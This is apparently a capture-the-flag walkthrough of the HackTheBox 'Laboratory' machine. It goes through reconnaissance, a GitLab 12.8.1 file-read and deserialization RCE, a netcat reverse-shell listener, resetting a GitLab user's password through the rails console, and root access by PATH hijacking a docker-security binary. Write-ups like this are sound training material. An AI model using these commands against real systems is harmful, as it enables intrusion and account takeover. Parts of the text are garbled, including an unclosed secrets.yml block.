Hi everyone, today we are going to be looking at Laboratory --`10.10.10.216`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

From the output shown above, we can see that the machine is a Linux machine and I added `laboratory.htb` as well as the Alternative name -- `git.laboratory.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 3 open ports, I started by browsing to port 80 which redirected the user to the secure (port 443) site:

### Basic Web Enumeration
All of the links on the homepage seemed to just redirect to the homepage. Before continuing, I decided to start a Gobuster scan in the background, the output of which is shown below:

<details>

### Exploiting Gitlab Community

While that was running, I navigated to the `Git` application and was presented with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img2.png"  style="width: 80%" />
</p>

In order to register, I needed to ensure that the user's email address made use of the `laboratory` domain. Once registered, I was redirected to the companies Gitlab page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img3.png"  style="width: 80%" />
</p>

I started browsing the web application and explored the projects that the user had access to, which lead me to the `SecureWebsite` project:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img4.png"  style="width: 80%" />
</p>

I now had access to the source code as well as a potential username: `Dexter McPherson`. The only other items, apart from the source code, was an issue report by `Seven`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img5.png"  style="width: 80%" />
</p>

After poking around a bit more, I realised that there wasn't anything that I could exploit at this point. I went back to the homepage and started enumeration again -- I realised that the version that was running was "GitLab Community Edition 12.8.1". A quick Google search lead me to an RCE vulnerability: <https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/>.

> This module provides remote code execution against GitLab Community Edition (CE) and Enterprise Edition (EE). It combines an arbitrary file read to extract the Rails "secret_key_base", and gains remote code execution with a deserialization vulnerability of a signed 'experimentation_subject_id' cookie that GitLab uses internally for A/B testing.

The issue itself was found on HackerOne: <https://hackerone.com/reports/827052>, the exploit above basically uses the fact that the `UploadsRewriter` does not validate the file name in order to exploit the vulnerability by exploiting a serialization vulnerability using the secret key from the `secrets.yml` file which is provided below:

<details>

```text
cat ../etc/secrets.yml                          
# This file is managed by gitlab-ctl. Manual changes will be                                                      # erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

There was a git project for this exploit, so I decided to download the project and run it: <https://github.com/dotPY-hax/gitlab_RCE>.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img6.png"  style="width: 80%" />
</p>

After successfully running the exploit, I managed to obtain a shell on the machine:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img7.png"  style="width: 80%" />
</p>

## Lateral Movement using Git
Now that I had a foothold on the machine, I performed some basic enumeration, the output of which is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Laboratory$ nc -nlvp 42069
listening on [any] 42069 ...
connect to [10.10.14.93] from (UNKNOWN) [10.10.10.216] 52532
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux git.laboratory.htb 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
git.laboratory.htb
 
id
uid=998(git) gid=998(git) groups=998(git)
 
ifconfig:
 
groups:
git
```
</details>

After running some basic enumeration with linpeas, it turned out that I was in a docker container. Since I was in the Gitlab repository and I didn't have any privileges, I decided to make use of `gitlab-rails console`. Since I was the `Git` user, I effectively had the ability to alter settings within Gitlab. Gitlab has a decent cheat sheet which I used during this phase: <https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html>. 

Since I knew there was a `Dexter` user, my idea was to locate that user and change the password to a password that I knew. The commands that I made use of are shown below:

```ruby
user = User.where(id: 1).first
user.password = 'hotshoto'
user.password_confirmation = 'hotshoto'
user.save!
```
<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img8.png"  style="width: 80%" />
</p>

With the password successfully changed, I was able to log into the application as `dexter`. After browsing the Gitlab projects, I realised that I now had access to the `SecureDocker` project which contained Dexter's SSH key. I downloaded the key and I was able to successfully authenticate to the host via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img9.png"  style="width: 80%" />
</p>

An alternative method to the example above would have been to set the `Admin` token for my user and use the newly assigned privileges to gain administrative rights within the Gitlab instance.  

## Privilege Escalation using Dexter

With access to the host, I started off with some basic enumeration and I found the user's `.viminfo` file which contained the following information:

<details>

```bat
dexter@laboratory:~$ cat .viminfo
# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!

# Viminfo version

# hlsearch on (H) or off (h):

|2,0,1615450281,,"q1"

```
</details>

What was interesting was the file marks on `usr/local/bin/docker-security`. Opening the file showed the following useful information: `chmod 700 /usr/bin/dockerchmod 660 /var/run/docker.sock`. The Binary performed execution without the use of an absolute path, so theoretically, I could have my own `chmod` file with `/bin/bash` binary to execute. In order to exploit this, I created a simple `chmod` binary in the `/tmp` folder:
```bash
#!/bin/bash
/usr//bin/bash 
```

Once I gave the binary execute permissions (`chmod +x chmod`), I added the `/tmp` directory to the environment's PATH variable:

```bat
export PATH=/tmp:$PATH 
```

Finally, I ran the docker-security binary and obtained a root shell as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Laboratory/img10.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
